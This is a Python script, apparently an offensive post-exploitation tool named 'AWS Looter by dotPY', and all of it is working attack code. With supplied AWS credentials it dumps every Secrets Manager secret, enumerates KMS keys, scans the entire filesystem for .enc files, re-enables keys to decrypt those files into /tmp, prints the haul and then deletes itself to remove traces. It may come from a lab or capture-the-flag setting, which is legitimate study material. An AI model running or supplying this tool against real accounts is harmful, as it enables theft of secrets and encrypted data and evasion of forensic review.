import json
import os
import random
import string
import subprocess
import argparse


class AWSEnum:
    def __init__(self, url, key, secret):
        self.endpoint_url = url
        self.aws_key = key
        self.aws_secret = secret
        self.file_path_blacklist = ["font"]

        self.aws_name = "aws"
        self.endpoint_parameter = "--endpoint-url="
        self.delimiter = "=" * 10

        self.secrets = []
        self.keys = []
        self.key_meta_data = {}
        self.enc_files = []
        self.decrypted = []

    def run_aws_configuration(self):
        commands = ["configure set aws_access_key_id " + self.aws_key,
                    "configure set aws_secret_access_key " + self.aws_secret,
                    "configure set default.region eu"]
        for command in commands:
            print(self.run_aws_process(command))

    def craft_command(self, command_parameters):
        endpoint = ""
        if self.endpoint_url:
            endpoint = self.endpoint_parameter + self.endpoint_url

        command = " ".join([self.aws_name, endpoint, command_parameters])

        return command

    def run_aws_process(self, command, show_error=True):
        command = self.craft_command(command)
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        if show_error and stderr:
            print(process.args)
            print(stderr.decode())
        return stdout.decode()

    def get_secrets(self):
        command = "secretsmanager list-secrets"
        stdout = self.run_aws_process(command)
        secret_json = json.loads(stdout)
        secrets = secret_json["SecretList"]
        secret_ids = [secret["ARN"] for secret in secrets]
        for secret_id in secret_ids:
            secret = self.get_secret_by_id(secret_id)
            self.secrets.append(secret)

    def get_secret_by_id(self, secret_id):
        command = "secretsmanager get-secret-value --secret-id '{}'".format(secret_id)
        stdout = self.run_aws_process(command)
        secret_json = json.loads(stdout)
        secret = secret_json["SecretString"]
        name = secret_json["Name"]
        return [name, secret]

    def get_decrypt_keys(self):
        command = "kms list-keys"
        stdout = self.run_aws_process(command)
        keys = json.loads(stdout)
        for key in keys["Keys"]:
            key_id = key["KeyId"]
            arn = key["KeyArn"]
            self.keys.append([key_id, arn])

    def get_decrypt_key_metadata(self):
        template = "kms describe-key --key-id "
        for key in self.keys:
            key_id = key[0]
            command = template + key_id
            stdout = self.run_aws_process(command)
            key_json = json.loads(stdout)
            metadata = key_json["KeyMetadata"]
            self.key_meta_data[key_id] = metadata

    def find_enc_files(self):
        for dirpath, dirnames, filenames in os.walk("/"):
            for filename in filenames:
                if filename.endswith(".enc"):
                    self.enc_files.append(os.path.join(dirpath, filename))

    def try_decrypt_files(self):
        for file in self.enc_files:
            if self.check_blacklist(file):
                print("{} contains blacklisted string".format(file))
                continue
            print("trying to decrypt {}".format(file))
            self.try_decrypt_file(file)

    def check_blacklist(self, file_path):
        for blacklisted in self.file_path_blacklist:
            if blacklisted in file_path:
                return True
        return False

    def try_decrypt_file(self, file_path):
        for key, metadata in self.key_meta_data.items():
            key_id = key
            try:
                algorithms = metadata["EncryptionAlgorithms"]
            except KeyError:
                continue
            for algorithm in algorithms:
                result = self._try_decrypt_file(key_id, file_path, algorithm)
                if result:
                    print("DECRYPTED {}".format(file_path))
                    json_result = json.loads(result)
                    result = json_result["Plaintext"]
                    name = self.write_to_tmp(result)
                    self.decrypted.append(name)

        return False

    def write_to_tmp(self, to_write):
        random_name = "".join([random.choice(string.ascii_letters) for _ in range(8)])
        file_name = os.path.join("/tmp/" + random_name)
        with open(file_name, "w") as file:
            file.write(to_write)
        return file_name

    def _try_decrypt_file(self, key_id, file_path, algorithm):
        command = 'kms enable-key --key-id {}'.format(key_id)
        self.run_aws_process(command)
        command = 'kms decrypt --key-id {} --ciphertext-blob=fileb://{} --encryption-algorithm "{}"'.format(key_id, file_path, algorithm)
        stdout = self.run_aws_process(command, show_error=False)
        return stdout

    def loot_decrypt_keys(self):
        print("looting decrypt keys")
        self.get_decrypt_keys()
        print("{} keys looted".format(len(self.keys)))
        print("\n")

    def loot_decrypt_key_metadata(self):
        print("looting decrypt keys metadata")
        self.get_decrypt_key_metadata()
        print("{} keys metadata looted".format(len(self.key_meta_data.keys())))
        print("\n")

    def loot_secrets(self):
        print("looting secrets")
        self.get_secrets()
        print("{} secrets looted".format(len(self.secrets)))
        print("\n")

    def loot_enc_files(self):
        print("looting (probably) encrypted files")
        self.find_enc_files()
        print("{} (probably) encrypted files looted".format(len(self.enc_files)))
        print("\n")

    def loot_decrypted_files(self):
        print("Decrypting files")
        self.try_decrypt_files()
        print("{} decrypted files looted".format(len(self.decrypted)))
        print("\n")

    def loot(self):
        self.loot_decrypt_keys()
        self.loot_decrypt_key_metadata()
        self.loot_secrets()
        self.loot_enc_files()
        self.loot_decrypted_files()

    def dump(self):
        print(self.delimiter + "SECRETS" + self.delimiter)
        for secret in self.secrets: print(secret)
        print(self.delimiter + "KEYS" + self.delimiter)
        for key in self.keys: print(key)
        print(self.delimiter + "(PROBABLY) ENCRYPTED FILES" + self.delimiter)
        for file in self.enc_files: print(file)
        print(self.delimiter + "DECRYPTED FILES" + self.delimiter)
        for file in self.decrypted: print(file)

    def banner(self):
        print("AWS Looter by dotPY")

    def remove_myself(self):
        my_file = os.path.abspath(__file__)
        os.remove(my_file)

    def run(self):
        self.banner()
        self.run_aws_configuration()
        self.loot()
        self.dump()
        self.remove_myself()

def cli():
    parser = argparse.ArgumentParser(description="AWS Looter by dotPY")
    print("BE SURE ABOUT YOUR CREDENTIALS SINCE THERE IS NO ERROR HANDLING!")
    parser.add_argument("--secret", help="AWS secret key", required=True)
    parser.add_argument("--access", help="AWS access key", required=True)
    parser.add_argument("--endpoint", help="Endpoint URL", required=True)
    args = parser.parse_args()
    aws_enum = AWSEnum(args.endpoint, args.access, args.secret)
    aws_enum.run()


cli()
